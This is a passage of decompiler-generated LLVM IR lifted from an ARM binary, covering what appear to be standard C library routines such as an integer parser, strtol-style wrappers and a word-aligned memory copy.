  br label %bb11

bb10:                                             ; preds = %dec_label_pc_14eb8
  br label %bb11

bb11:                                             ; preds = %bb, %bb10
  %v1_14f0c = phi i32 [ %v6_14ef8, %bb ], [ -1, %bb10 ]
  store i32 %v6_14eb8, i32* @r5, align 4
  store i32 %v9_14eb8, i32* @r6, align 4
  ret i32 %v1_14f0c

; uselistorder directives
  uselistorder i32* %stack_var_-296, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, i32)* @function_15548, { 0, 4, 6, 7, 1, 2, 3, 5 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_14f10() local_unnamed_addr {
dec_label_pc_14f10:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14f10 = load i32, i32* @r4, align 4
  store i32 %v3_14f10, i32* %stack_var_-8, align 4
  %v0_14f14 = call i32 @function_158fc()
  store i32 %v0_14f14, i32* %r4.global-to-local, align 4
  %v2_14f18 = icmp eq i32 %v0_14f14, 0
  br i1 %v2_14f18, label %dec_label_pc_14f2c, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %dec_label_pc_14f10
  %v0_14f20 = call i32 @function_12ecc()
  %v0_14f24 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f24 = inttoptr i32 %v0_14f20 to i32*
  store i32 %v0_14f24, i32* %v2_14f24, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14f2c

dec_label_pc_14f2c:                               ; preds = %dec_label_pc_14f10, %dec_label_pc_14f20
  %v0_14f2c = phi i32 [ 0, %dec_label_pc_14f10 ], [ -1, %dec_label_pc_14f20 ]
  %v2_14f30 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14f30, i32* @r4, align 4
  ret i32 %v0_14f2c

; uselistorder directives
  uselistorder label %dec_label_pc_14f2c, { 1, 0 }
}

define i32 @function_14f38(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f38:
  %v0_14f44.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14f44

dec_label_pc_14f40:                               ; preds = %dec_label_pc_14f44, %bb29
  %v1_14f40 = add i32 %v0_14f40, 1
  br label %dec_label_pc_14f44

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14f38, %dec_label_pc_14f40
  %v0_14f40 = phi i32 [ %v0_14f44.pre, %dec_label_pc_14f38 ], [ %v1_14f40, %dec_label_pc_14f40 ]
  %v1_14f44 = inttoptr i32 %v0_14f40 to i8*
  %v2_14f44 = load i8, i8* %v1_14f44, align 1
  %v3_14f44 = zext i8 %v2_14f44 to i32
  %v1_14f48 = add nsw i32 %v3_14f44, -9
  %v7_14f4c = icmp eq i8 %v2_14f44, 32
  br i1 %v7_14f4c, label %dec_label_pc_14f40, label %bb

bb:                                               ; preds = %dec_label_pc_14f44
  %v3_14f50 = icmp ugt i32 %v1_14f48, 3
  %v8_14f50 = icmp eq i32 %v1_14f48, 4
  %v2_14f54 = xor i1 %v8_14f50, true
  %v3_14f54 = and i1 %v3_14f50, %v2_14f54
  br i1 %v3_14f54, label %bb28, label %bb29

bb28:                                             ; preds = %bb
  br label %bb29

bb29:                                             ; preds = %bb, %bb28
  %v1_14f6c7 = phi i32 [ %v1_14f48, %bb ], [ 0, %bb28 ]
  %v2_14f58 = xor i1 %v3_14f50, true
  %v3_14f58 = or i1 %v8_14f50, %v2_14f58
  br i1 %v3_14f58, label %dec_label_pc_14f40, label %dec_label_pc_14f60

dec_label_pc_14f60:                               ; preds = %bb29
  %v7_14f60 = icmp eq i8 %v2_14f44, 43
  br i1 %v7_14f60, label %dec_label_pc_14f80, label %dec_label_pc_14f68

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14f60
  %v7_14f68 = icmp eq i8 %v2_14f44, 45
  br i1 %v7_14f68, label %dec_label_pc_14f80, label %bb30

bb30:                                             ; preds = %dec_label_pc_14f68
  br label %dec_label_pc_14f84

dec_label_pc_14f80:                               ; preds = %dec_label_pc_14f60, %dec_label_pc_14f68
  %storemerge = phi i32 [ 1, %dec_label_pc_14f68 ], [ %v1_14f6c7, %dec_label_pc_14f60 ]
  %v1_14f80 = add i32 %v0_14f40, 1
  br label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %bb30, %dec_label_pc_14f80
  %v0_14fac = phi i32 [ %v1_14f6c7, %bb30 ], [ %storemerge, %dec_label_pc_14f80 ]
  %v0_14f9c9 = phi i32 [ %v0_14f40, %bb30 ], [ %v1_14f80, %dec_label_pc_14f80 ]
  br label %dec_label_pc_14f9c

dec_label_pc_14f90:                               ; preds = %dec_label_pc_14f9c
  %v2_14f90 = mul i32 %v0_14f90, 10
  %v1_14f94 = add i32 %v0_14f94, 1
  %v2_14f98 = sub i32 %v2_14f90, %v1_14fa0
  br label %dec_label_pc_14f9c

dec_label_pc_14f9c:                               ; preds = %dec_label_pc_14f84, %dec_label_pc_14f90
  %v0_14f90 = phi i32 [ 0, %dec_label_pc_14f84 ], [ %v2_14f98, %dec_label_pc_14f90 ]
  %v0_14f94 = phi i32 [ %v0_14f9c9, %dec_label_pc_14f84 ], [ %v1_14f94, %dec_label_pc_14f90 ]
  %v1_14f9c = inttoptr i32 %v0_14f94 to i8*
  %v2_14f9c = load i8, i8* %v1_14f9c, align 1
  %v3_14f9c = zext i8 %v2_14f9c to i32
  %v1_14fa0 = add nsw i32 %v3_14f9c, -48
  %tmp = icmp ult i32 %v1_14fa0, 10
  br i1 %tmp, label %dec_label_pc_14f90, label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %dec_label_pc_14f9c
  %v2_14fac = icmp eq i32 %v0_14fac, 0
  br i1 %v2_14fac, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_14fac
  %v2_14fb0 = sub i32 0, %v0_14f90
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_14fac, %bb32
  %v0_14fb4 = phi i32 [ %v0_14f90, %dec_label_pc_14fac ], [ %v2_14fb0, %bb32 ]
  ret i32 %v0_14fb4

; uselistorder directives
  uselistorder i32 %v0_14f94, { 1, 0 }
  uselistorder i32 %v1_14f6c7, { 1, 0 }
  uselistorder i1 %v8_14f50, { 1, 0 }
  uselistorder i32 %v0_14f40, { 0, 1, 3, 2 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder i8 32, { 14, 8, 9, 10, 0, 11, 12, 13, 1, 2, 3, 4, 5, 6, 7, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_14f9c, { 1, 0 }
  uselistorder label %dec_label_pc_14f84, { 1, 0 }
  uselistorder label %dec_label_pc_14f80, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_14f44, { 1, 0 }
  uselistorder label %dec_label_pc_14f40, { 1, 0 }
}

define i32 @function_14fc0() local_unnamed_addr {
dec_label_pc_14fc0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v6_14fc0 = load i32, i32* @r5, align 4
  %v9_14fc0 = load i32, i32* @r6, align 4
  %v12_14fc0 = load i32, i32* @r7, align 4
  %v0_14fc4 = load i32, i32* @r0, align 4
  store i32 %v0_14fc4, i32* @r5, align 4
  %v1_14fc4 = icmp slt i32 %v0_14fc4, 0
  %v4_14fd0 = add i32 %v0_14fc4, 2147483647
  %storemerge = select i1 %v1_14fc4, i32 -1, i32 %v4_14fd0
  %v2_14fd4 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_14fd4, i32* @r4, align 4
  %v0_14fd8 = load i32, i32* @r1, align 4
  store i32 %v0_14fd8, i32* @r7, align 4
  %v0_14fe4 = load i32, i32* @r2, align 4
  store i32 %v0_14fe4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v7_15008 = call i32 @function_16718(i32 %v2_14fd4, i32 0, i32 0, i32 0, i32 0, i32 %v0_14fc4, i32 %storemerge)
  store i32 %tmp3, i32* @r4, align 4
  %v0_15018 = load i32, i32* @r6, align 4
  %v6_15024 = sext i32 %v0_15018 to i64
  %v7_15024 = call i32 @function_15f58(i32 %v2_14fd4, i64 %v6_15024, i32 1, i32 %tmp12, i32 %tmp12, i32 %tmp3)
  %v0_15028 = load i32, i32* @r7, align 4
  %v2_15028 = icmp eq i32 %v0_15028, 0
  br i1 %v2_15028, label %dec_label_pc_1504c, label %dec_label_pc_15030

dec_label_pc_15030:                               ; preds = %dec_label_pc_14fc0
  %v0_15044 = load i32, i32* @r5, align 4
  %v2_15038 = add i32 %v0_14fc4, %tmp
  %v2_15040 = sub i32 %v2_15038, %storemerge
  %v2_15044 = add i32 %v2_15040, %v0_15044
  %v2_15048 = inttoptr i32 %v0_15028 to i32*
  store i32 %v2_15044, i32* %v2_15048, align 4
  br label %dec_label_pc_1504c

dec_label_pc_1504c:                               ; preds = %dec_label_pc_14fc0, %dec_label_pc_15030
  store i32 %v6_14fc0, i32* @r5, align 4
  store i32 %v9_14fc0, i32* @r6, align 4
  store i32 %v12_14fc0, i32* @r7, align 4
  ret i32 %v7_15024

; uselistorder directives
  uselistorder i32 %v2_14fd4, { 1, 0, 2 }
  uselistorder i32 %v0_14fc4, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1504c, { 1, 0 }
}

define i32 @function_15058() local_unnamed_addr {
dec_label_pc_15058:
  store i32 0, i32* @r4, align 4
  %v0_1506c = call i32 @function_14fc0()
  ret i32 %v0_1506c
}

define i32 @function_1507c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1507c:
  %v3_1507c = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_15090 = call i32 @function_14fc0()
  store i32 %v3_1507c, i32* @r4, align 4
  ret i32 %v0_15090
}

define i32 @function_150a0() local_unnamed_addr {
dec_label_pc_150a0:
  store i32 -2147483648, i32* @r4, align 4
  %v0_150b4 = call i32 @function_14fc0()
  ret i32 %v0_150b4
}

define i32 @function_150c8() local_unnamed_addr {
dec_label_pc_150c8:
  store i32 -1, i32* @r4, align 4
  %v0_150dc = call i32 @function_14fc0()
  ret i32 %v0_150dc

; uselistorder directives
  uselistorder i32 ()* @function_14fc0, { 3, 2, 0, 1 }
}

define i32 @function_150f0(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_150f0:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_150f0 = load i32, i32* %r0.global-to-local, align 4
  %v8_150f0 = load i32, i32* @r4, align 4
  %v11_150f0 = load i32, i32* @lr, align 4
  %v0_150f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_150f8 = add i32 %v0_150f8, -4
  %v2_150f8 = icmp ugt i32 %v0_150f8, 3
  store i1 %v2_150f8, i1* %cpsr_c.global-to-local, align 1
  %v6_150f8 = icmp slt i32 %v1_150f8, 0
  store i1 %v6_150f8, i1* %cpsr_n.global-to-local, align 1
  %v3_150fc = icmp ult i32 %v0_150f8, 2
  br i1 %v3_150fc, label %dec_label_pc_153cc, label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_150f0
  %v0_15100 = load i32, i32* %r1.global-to-local, align 4
  %v1_15100 = sub i32 0, %v0_15100
  %v1_15104 = urem i32 %v1_15100, 4
  store i32 %v1_15104, i32* @r3, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15104 = icmp eq i32 %v1_15104, 0
  br i1 %v2_15104, label %.thread2, label %dec_label_pc_1510c

dec_label_pc_1510c:                               ; preds = %dec_label_pc_15100
  %v1_1510c = and i32 %v1_15100, 2
  %v2_1510c = icmp ne i32 %v1_1510c, 0
  store i1 %v2_1510c, i1* %cpsr_c.global-to-local, align 1
  %v3_1510c = shl i32 %v1_15100, 31
  store i32 %v3_1510c, i32* %ip.global-to-local, align 4
  %v4_1510c = icmp ne i32 %v3_1510c, 0
  store i1 %v4_1510c, i1* %cpsr_n.global-to-local, align 1
  %v2_15110 = sub i32 %v0_150f8, %v1_15104
  store i32 %v2_15110, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_15104 to i8
  br i1 %v4_1510c, label %bb, label %bb128

bb:                                               ; preds = %dec_label_pc_1510c
  %v2_15114 = inttoptr i32 %v0_15100 to i8*
  %v3_15114 = load i8, i8* %v2_15114, align 1
  %v4_15114 = zext i8 %v3_15114 to i32
  store i32 %v4_15114, i32* @r3, align 4
  %v6_15114 = add i32 %v0_15100, 1
  store i32 %v6_15114, i32* %r1.global-to-local, align 4
  br label %bb128

bb128:                                            ; preds = %dec_label_pc_1510c, %bb
  %v1_15120.off0 = phi i8 [ %extract.t, %dec_label_pc_1510c ], [ %v3_15114, %bb ]
  %v1_15118 = phi i32 [ %v0_15100, %dec_label_pc_1510c ], [ %v6_15114, %bb ]
  %extract.t191 = trunc i32 %v8_150f0 to i8
  br i1 %v2_1510c, label %bb129, label %.thread

bb129:                                            ; preds = %bb128
  %v2_15118 = inttoptr i32 %v1_15118 to i8*
  %v3_15118 = load i8, i8* %v2_15118, align 1
  %v4_15118 = zext i8 %v3_15118 to i32
  store i32 %v4_15118, i32* @r4, align 4
  %v6_15118 = add i32 %v1_15118, 1
  store i32 %v6_15118, i32* %r1.global-to-local, align 4
  %v2_1511c = inttoptr i32 %v6_15118 to i8*
  %v3_1511c = load i8, i8* %v2_1511c, align 1
  %v4_1511c = zext i8 %v3_1511c to i32
  store i32 %v4_1511c, i32* %ip.global-to-local, align 4
  %v6_1511c = add i32 %v1_15118, 2
  store i32 %v6_1511c, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb128, %bb129
  %v1_15124182.off0 = phi i8 [ %extract.t191, %bb128 ], [ %v3_15118, %bb129 ]
  br i1 %v4_1510c, label %bb130, label %bb131

bb130:                                            ; preds = %.thread
  %v4_15120 = inttoptr i32 %v3_150f0 to i8*
  store i8 %v1_15120.off0, i8* %v4_15120, align 1
  %v5_15120 = load i32, i32* %r0.global-to-local, align 4
  %v6_15120 = add i32 %v5_15120, 1
  store i32 %v6_15120, i32* %r0.global-to-local, align 4
  %v0_15124.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15124.pre, label %bb130.bb132_crit_edge, label %.thread2

bb130.bb132_crit_edge:                            ; preds = %bb130
  %v1_15124.pre = load i32, i32* @r4, align 4
  %extract.t189 = trunc i32 %v1_15124.pre to i8
  br label %bb132

bb131:                                            ; preds = %.thread
  br i1 %v2_1510c, label %bb132, label %.thread2

bb132:                                            ; preds = %bb130.bb132_crit_edge, %bb131
  %v1_15124.off0 = phi i8 [ %extract.t189, %bb130.bb132_crit_edge ], [ %v1_15124182.off0, %bb131 ]
  %v3_1512488 = phi i32 [ %v6_15120, %bb130.bb132_crit_edge ], [ %v3_150f0, %bb131 ]
  %v4_15124 = inttoptr i32 %v3_1512488 to i8*
  store i8 %v1_15124.off0, i8* %v4_15124, align 1
  %v5_15124 = load i32, i32* %r0.global-to-local, align 4
  %v6_15124 = add i32 %v5_15124, 1
  store i32 %v6_15124, i32* %r0.global-to-local, align 4
  %v0_15128.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15128.pr, label %bb133, label %.thread2

bb133:                                            ; preds = %bb132
  %v1_15128 = load i32, i32* %ip.global-to-local, align 4
  %v2_15128 = trunc i32 %v1_15128 to i8
  %v4_15128 = inttoptr i32 %v6_15124 to i8*
  store i8 %v2_15128, i8* %v4_15128, align 1
  %v5_15128 = load i32, i32* %r0.global-to-local, align 4
  %v6_15128 = add i32 %v5_15128, 1
  store i32 %v6_15128, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb130, %bb131, %dec_label_pc_15100, %bb132, %bb133
  %v1_1515c = phi i32 [ %v3_150f0, %bb131 ], [ %v3_150f0, %dec_label_pc_15100 ], [ %v6_15124, %bb132 ], [ %v6_15128, %bb133 ], [ %v6_15120, %bb130 ]
  %v1_1512c = load i32, i32* %r1.global-to-local, align 4
  %v2_1512c = xor i32 %v1_1512c, %v1_1515c
  store i32 %v2_1512c, i32* @ip, align 4
  %v1_15130 = urem i32 %v2_1512c, 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15130 = icmp eq i32 %v1_15130, 0
  br i1 %v2_15130, label %dec_label_pc_15138, label %dec_label_pc_151e0

dec_label_pc_15138:                               ; preds = %.thread2
  %v2_15138 = load i32, i32* @r5, align 4
  store i32 %v2_15138, i32* %stack_var_-40, align 4
  %v5_15138 = load i32, i32* @r6, align 4
  %v8_15138 = load i32, i32* @r7, align 4
  %v11_15138 = load i32, i32* @r8, align 4
  %v14_15138 = load i32, i32* @sb, align 4
  %v17_15138 = load i32, i32* @sl, align 4
  %v20_15138 = load i32, i32* @fp, align 4
  %v1_1513c = sub i32 0, %v1_1515c
  %v1_15140 = and i32 %v1_1513c, 28
  store i32 %v1_15140, i32* @r3, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15140 = icmp eq i32 %v1_15140, 0
  %v0_15174.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_15140, label %dec_label_pc_15174, label %dec_label_pc_15148

dec_label_pc_15148:                               ; preds = %dec_label_pc_15138
  %v2_15148 = sub i32 %v1_15140, %v0_15174.pre
  %v3_15148 = icmp uge i32 %v1_15140, %v0_15174.pre
  store i1 %v3_15148, i1* %cpsr_c.global-to-local, align 1
  %v8_15148 = icmp slt i32 %v2_15148, 0
  store i1 %v8_15148, i1* %cpsr_n.global-to-local, align 1
  %tmp197 = icmp ugt i32 %v1_15140, %v0_15174.pre
  br i1 %tmp197, label %bb134, label %bb135

bb134:                                            ; preds = %dec_label_pc_15148
  %v5_1514c = and i32 %v0_15174.pre, 28
  store i32 %v5_1514c, i32* @r3, align 4
  br label %bb135

bb135:                                            ; preds = %dec_label_pc_15148, %bb134
  %v0_15150 = phi i32 [ %v1_15140, %dec_label_pc_15148 ], [ %v5_1514c, %bb134 ]
  %v1_15150 = and i32 %v0_15150, 16
  %v2_15150 = icmp ne i32 %v1_15150, 0
  store i1 %v2_15150, i1* %cpsr_c.global-to-local, align 1
  %v3_15150 = mul i32 %v0_15150, 268435456
  store i32 %v3_15150, i32* @ip, align 4
  %v4_15150 = icmp slt i32 %v3_15150, 0
  store i1 %v4_15150, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_15150, label %bb136, label %bb137

bb136:                                            ; preds = %bb135
  %v2_15154 = inttoptr i32 %v1_1512c to i32*
  %v3_15154 = load i32, i32* %v2_15154, align 4
  store i32 %v3_15154, i32* @r4, align 4
  %v4_15154 = add i32 %v1_1512c, 4
  %v5_15154 = inttoptr i32 %v4_15154 to i32*
  %v6_15154 = load i32, i32* %v5_15154, align 4
  store i32 %v6_15154, i32* @r5, align 4
  %v7_15154 = add i32 %v1_1512c, 8
  %v8_15154 = inttoptr i32 %v7_15154 to i32*
  %v9_15154 = load i32, i32* %v8_15154, align 4
  store i32 %v9_15154, i32* @r6, align 4
  %v10_15154 = add i32 %v1_1512c, 12
  %v11_15154 = inttoptr i32 %v10_15154 to i32*
  %v12_15154 = load i32, i32* %v11_15154, align 4
  store i32 %v12_15154, i32* @r7, align 4
  %v13_15154 = add i32 %v1_1512c, 16
  store i32 %v13_15154, i32* %r1.global-to-local, align 4
  br i1 %v4_15150, label %bb138, label %.thread89

bb137:                                            ; preds = %bb135
  br i1 %v4_15150, label %bb138, label %.thread93

bb138:                                            ; preds = %bb137, %bb136
  %v1_15158 = phi i32 [ %v13_15154, %bb136 ], [ %v1_1512c, %bb137 ]
  %v2_15158 = inttoptr i32 %v1_15158 to i32*
  %v3_15158 = load i32, i32* %v2_15158, align 4
  store i32 %v3_15158, i32* @r8, align 4
  %v4_15158 = add i32 %v1_15158, 4
  %v5_15158 = inttoptr i32 %v4_15158 to i32*
  %v6_15158 = load i32, i32* %v5_15158, align 4
  store i32 %v6_15158, i32* @sb, align 4
  %v7_15158 = add i32 %v1_15158, 8
  store i32 %v7_15158, i32* %r1.global-to-local, align 4
  br i1 %v2_15150, label %bb138..thread89_crit_edge, label %.thread91

bb138..thread89_crit_edge:                        ; preds = %bb138
  %v3_1515c.pre = load i32, i32* @r4, align 4
  br label %.thread89

.thread89:                                        ; preds = %bb138..thread89_crit_edge, %bb136
  %v3_1515c = phi i32 [ %v3_1515c.pre, %bb138..thread89_crit_edge ], [ %v3_15154, %bb136 ]
  %v2_1515c = inttoptr i32 %v1_1515c to i32*
  store i32 %v3_1515c, i32* %v2_1515c, align 4
  %v4_1515c = add i32 %v1_1515c, 4
  %v5_1515c = inttoptr i32 %v4_1515c to i32*
  %v6_1515c = load i32, i32* @r5, align 4
  store i32 %v6_1515c, i32* %v5_1515c, align 4
  %v7_1515c = add i32 %v1_1515c, 8
  %v8_1515c = inttoptr i32 %v7_1515c to i32*
  %v9_1515c = load i32, i32* @r6, align 4
  store i32 %v9_1515c, i32* %v8_1515c, align 4
  %v10_1515c = add i32 %v1_1515c, 12
  %v11_1515c = inttoptr i32 %v10_1515c to i32*
  %v12_1515c = load i32, i32* @r7, align 4
  store i32 %v12_1515c, i32* %v11_1515c, align 4
  %v13_1515c = add i32 %v1_1515c, 16
  store i32 %v13_1515c, i32* %r0.global-to-local, align 4
  br i1 %v4_15150, label %.thread89..thread91_crit_edge, label %.thread93

.thread89..thread91_crit_edge:                    ; preds = %.thread89
  %v3_15160.pre = load i32, i32* @r8, align 4
  br label %.thread91

.thread91:                                        ; preds = %.thread89..thread91_crit_edge, %bb138
  %v3_15160 = phi i32 [ %v3_15160.pre, %.thread89..thread91_crit_edge ], [ %v3_15158, %bb138 ]
  %v1_1516092 = phi i32 [ %v13_1515c, %.thread89..thread91_crit_edge ], [ %v1_1515c, %bb138 ]
  %v2_15160 = inttoptr i32 %v1_1516092 to i32*
  store i32 %v3_15160, i32* %v2_15160, align 4
  %v4_15160 = add i32 %v1_1516092, 4
  %v5_15160 = inttoptr i32 %v4_15160 to i32*
  %v6_15160 = load i32, i32* @sb, align 4
  store i32 %v6_15160, i32* %v5_15160, align 4
  %v7_15160 = add i32 %v1_1516092, 8
  store i32 %v7_15160, i32* %r0.global-to-local, align 4
  br label %.thread93

.thread93:                                        ; preds = %bb137, %.thread89, %.thread91
  %v2_1516c = phi i32 [ %v13_1515c, %.thread89 ], [ %v7_15160, %.thread91 ], [ %v1_1515c, %bb137 ]
  %v0_15164 = load i32, i32* @r3, align 4
  %v1_15164 = and i32 %v0_15164, 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15164 = icmp eq i32 %v1_15164, 0
  br i1 %v2_15164, label %.thread3, label %bb139

bb139:                                            ; preds = %.thread93
  %v1_15168 = load i32, i32* %r1.global-to-local, align 4
  %v2_15168 = inttoptr i32 %v1_15168 to i32*
  %v3_15168 = load i32, i32* %v2_15168, align 4
  store i32 %v3_15168, i32* %sl.global-to-local, align 4
  %v5_15168 = add i32 %v1_15168, 4
  store i32 %v5_15168, i32* %r1.global-to-local, align 4
  %v3_1516c = inttoptr i32 %v2_1516c to i32*
  store i32 %v3_15168, i32* %v3_1516c, align 4
  %v4_1516c = load i32, i32* %r0.global-to-local, align 4
  %v5_1516c = add i32 %v4_1516c, 4
  store i32 %v5_1516c, i32* %r0.global-to-local, align 4
  %v1_15170.pre = load i32, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread93, %bb139
  %v0_1518465 = phi i32 [ %v2_1516c, %.thread93 ], [ %v5_1516c, %bb139 ]
  %v1_15170 = phi i32 [ %v0_15164, %.thread93 ], [ %v1_15170.pre, %bb139 ]
  %v0_15170 = load i32, i32* %r2.global-to-local, align 4
  %v2_15170 = sub i32 %v0_15170, %v1_15170
  store i32 %v2_15170, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15174

dec_label_pc_15174:                               ; preds = %dec_label_pc_15138, %.thread3
  %v0_1518464 = phi i32 [ %v0_1518465, %.thread3 ], [ %v1_1515c, %dec_label_pc_15138 ]
  %v0_15174 = phi i32 [ %v2_15170, %.thread3 ], [ %v0_15174.pre, %dec_label_pc_15138 ]
  %v1_15174 = add i32 %v0_15174, -32
  store i32 %v1_15174, i32* @r2, align 4
  %v2_15174 = icmp ugt i32 %v0_15174, 31
  store i1 %v2_15174, i1* %cpsr_c.global-to-local, align 1
  %v6_15174 = icmp slt i32 %v1_15174, 0
  store i1 %v6_15174, i1* %cpsr_n.global-to-local, align 1
  %v3_15178 = icmp ult i32 %v1_15174, 30
  br i1 %v3_15178, label %dec_label_pc_15190, label %dec_label_pc_1517c

dec_label_pc_1517c:                               ; preds = %dec_label_pc_15174, %dec_label_pc_1517c.dec_label_pc_1517c_crit_edge
  %v0_15184 = phi i32 [ %v24_15184, %dec_label_pc_1517c.dec_label_pc_1517c_crit_edge ], [ %v0_1518464, %dec_label_pc_15174 ]
  %v0_15180 = phi i32 [ %v0_15180.pre, %dec_label_pc_1517c.dec_label_pc_1517c_crit_edge ], [ %v1_15174, %dec_label_pc_15174 ]
  %v0_1517c = load i32, i32* %r1.global-to-local, align 4
  %v1_1517c = inttoptr i32 %v0_1517c to i32*
  %v2_1517c = load i32, i32* %v1_1517c, align 4
  store i32 %v2_1517c, i32* @r4, align 4
  %v3_1517c = add i32 %v0_1517c, 4
  %v4_1517c = inttoptr i32 %v3_1517c to i32*
  %v5_1517c = load i32, i32* %v4_1517c, align 4
  store i32 %v5_1517c, i32* @r5, align 4
  %v6_1517c = add i32 %v0_1517c, 8
  %v7_1517c = inttoptr i32 %v6_1517c to i32*
  %v8_1517c = load i32, i32* %v7_1517c, align 4
  store i32 %v8_1517c, i32* @r6, align 4
  %v9_1517c = add i32 %v0_1517c, 12
  %v10_1517c = inttoptr i32 %v9_1517c to i32*
  %v11_1517c = load i32, i32* %v10_1517c, align 4
  store i32 %v11_1517c, i32* @r7, align 4
  %v12_1517c = add i32 %v0_1517c, 16
  %v13_1517c = inttoptr i32 %v12_1517c to i32*
  %v14_1517c = load i32, i32* %v13_1517c, align 4
  store i32 %v14_1517c, i32* @r8, align 4
  %v15_1517c = add i32 %v0_1517c, 20
  %v16_1517c = inttoptr i32 %v15_1517c to i32*
  %v17_1517c = load i32, i32* %v16_1517c, align 4
  store i32 %v17_1517c, i32* @sb, align 4
  %v18_1517c = add i32 %v0_1517c, 24
  %v19_1517c = inttoptr i32 %v18_1517c to i32*
  %v20_1517c = load i32, i32* %v19_1517c, align 4
  store i32 %v20_1517c, i32* %sl.global-to-local, align 4
  %v21_1517c = add i32 %v0_1517c, 28
  %v22_1517c = inttoptr i32 %v21_1517c to i32*
  %v23_1517c = load i32, i32* %v22_1517c, align 4
  store i32 %v23_1517c, i32* %fp.global-to-local, align 4
  %v24_1517c = add i32 %v0_1517c, 32
  store i32 %v24_1517c, i32* %r1.global-to-local, align 4
  %v1_15180 = add i32 %v0_15180, -32
  store i32 %v1_15180, i32* %r2.global-to-local, align 4
  %v2_15180 = icmp ugt i32 %v0_15180, 31
  %v1_15184 = inttoptr i32 %v0_15184 to i32*
  store i32 %v2_1517c, i32* %v1_15184, align 4
  %v3_15184 = add i32 %v0_15184, 4
  %v4_15184 = inttoptr i32 %v3_15184 to i32*
  %v5_15184 = load i32, i32* @r5, align 4
  store i32 %v5_15184, i32* %v4_15184, align 4
  %v6_15184 = add i32 %v0_15184, 8
  %v7_15184 = inttoptr i32 %v6_15184 to i32*
  %v8_15184 = load i32, i32* @r6, align 4
  store i32 %v8_15184, i32* %v7_15184, align 4
  %v9_15184 = add i32 %v0_15184, 12
  %v10_15184 = inttoptr i32 %v9_15184 to i32*
  %v11_15184 = load i32, i32* @r7, align 4
  store i32 %v11_15184, i32* %v10_15184, align 4
  %v12_15184 = add i32 %v0_15184, 16
  %v13_15184 = inttoptr i32 %v12_15184 to i32*
  %v14_15184 = load i32, i32* @r8, align 4
  store i32 %v14_15184, i32* %v13_15184, align 4
  %v15_15184 = add i32 %v0_15184, 20
  %v16_15184 = inttoptr i32 %v15_15184 to i32*
  %v17_15184 = load i32, i32* @sb, align 4
  store i32 %v17_15184, i32* %v16_15184, align 4
  %v18_15184 = add i32 %v0_15184, 24
  %v19_15184 = inttoptr i32 %v18_15184 to i32*
  %v20_15184 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v20_15184, i32* %v19_15184, align 4
  %v21_15184 = add i32 %v0_15184, 28
  %v22_15184 = inttoptr i32 %v21_15184 to i32*
  %v23_15184 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v23_15184, i32* %v22_15184, align 4
  %v24_15184 = add i32 %v0_15184, 32
  store i32 %v24_15184, i32* %r0.global-to-local, align 4
